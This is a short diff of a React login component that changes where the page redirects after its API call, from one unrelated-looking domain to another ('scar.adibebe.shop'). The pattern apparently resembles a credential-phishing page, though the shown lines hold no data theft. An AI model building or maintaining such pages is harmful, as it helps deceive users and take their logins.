@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://sck.dukesgroundslkeeping.com/';
+      window.location.href = 'https://scar.adibebe.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
@@ -136,3 +136,4 @@ const Login = () => {
 };
 
 export default Login;
+
